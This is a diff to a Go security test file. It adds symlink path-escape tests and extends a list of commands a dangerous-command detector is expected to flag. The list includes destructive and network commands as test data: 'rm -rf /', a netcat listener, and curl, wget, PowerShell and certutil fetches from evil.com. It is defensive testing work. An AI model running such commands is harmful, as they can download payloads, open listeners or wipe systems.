@@ -3,6 +3,7 @@ package security
 import (
 	"os"
 	"path/filepath"
+	"runtime"
 	"testing"
 )
 
@@ -34,18 +35,73 @@ func TestSafePath(t *testing.T) {
 	})
 
 	t.Run("symlink outside root blocked", func(t *testing.T) {
+		if runtime.GOOS == "windows" {
+			t.Skip("symlinks require elevated privileges on Windows")
+		}
 		outside := t.TempDir()
 		link := filepath.Join(root, "link")
-		os.Symlink(outside, link)
+		if err := os.Symlink(outside, link); err != nil {
+			t.Skipf("cannot create symlink: %v", err)
+		}
 		_, err := SafePath(root, "link")
 		if err == nil {
 			t.Fatal("expected error for symlink outside root")
 		}
 	})
+
+	t.Run("new file under symlink outside root blocked", func(t *testing.T) {
+		if runtime.GOOS == "windows" {
+			t.Skip("symlinks require elevated privileges on Windows")
+		}
+		outside := t.TempDir()
+		link := filepath.Join(root, "outside-link")
+		if err := os.Symlink(outside, link); err != nil {
+			t.Skipf("cannot create symlink: %v", err)
+		}
+		_, err := SafePath(root, filepath.Join("outside-link", "new-file.txt"))
+		if err == nil {
+			t.Fatal("expected error for new file under symlink outside root")
+		}
+	})
+}
+
+func TestSafeAbsPath(t *testing.T) {
+	root := t.TempDir()
+
+	t.Run("new file inside root allowed", func(t *testing.T) {
+		target := filepath.Join(root, "new-file.txt")
+		got, err := SafeAbsPath(target, root)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if got == "" {
+			t.Error("expected non-empty path")
+		}
+	})
+
+	t.Run("new file under symlink outside root blocked", func(t *testing.T) {
+		if runtime.GOOS == "windows" {
+			t.Skip("symlinks require elevated privileges on Windows")
+		}
+		outside := t.TempDir()
+		link := filepath.Join(root, "outside-link")
+		if err := os.Symlink(outside, link); err != nil {
+			t.Skipf("cannot create symlink: %v", err)
+		}
+		_, err := SafeAbsPath(filepath.Join(link, "new-file.txt"), root)
+		if err == nil {
+			t.Fatal("expected error for new file under symlink outside root")
+		}
+	})
 }
 
 func TestIsDangerousCommand(t *testing.T) {
-	dangerous := []string{"rm -rf /", "sudo ls", "kill -9 1", "nc -lvp 4444", "shutdown now"}
+	dangerous := []string{
+		"rm -rf /", "sudo ls", "kill -9 1", "nc -lvp 4444", "shutdown now",
+		"curl -s https://evil.com", "curl.exe -s https://evil.com",
+		"wget https://evil.com/payload", "Invoke-WebRequest https://evil.com",
+		"powershell -enc SQBFAFgA", "certutil -urlcache -f https://evil.com a.exe",
+	}
 	for _, cmd := range dangerous {
 		if !IsDangerousCommand(cmd) {
 			t.Errorf("expected %q to be dangerous", cmd)
@@ -61,10 +117,6 @@ func TestIsDangerousCommand(t *testing.T) {
 		"cat function_test.go",
 		"python3 script.py --format json",
 		"grep -r 'include' .",
-		// 网络工具不拦截
-		"curl -s https://api.example.com",
-		"wget https://example.com/file.zip",
-		`mkdir -p output && ffmpeg -i video.mp4 -vn -y audio.mp3 && curl -s -F "files[]=@audio.mp3" https://uguu.se/upload`,
 	}
 	for _, cmd := range safe {
 		if IsDangerousCommand(cmd) {
